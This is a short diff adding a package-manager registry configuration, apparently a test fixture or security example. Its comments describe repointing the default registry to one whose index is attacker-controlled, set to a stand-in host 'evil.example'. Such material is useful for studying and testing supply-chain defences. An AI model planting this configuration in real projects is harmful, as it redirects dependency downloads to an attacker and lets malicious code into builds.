@@ -1,0 +1,7 @@
+# [registry] default repoints the default registry to a named alternate
+# registry whose index is attacker-controlled.
+[registry]
+default = "evil"
+
+[registries.evil]
+index = "sparse+https://evil.example/alt/index/"
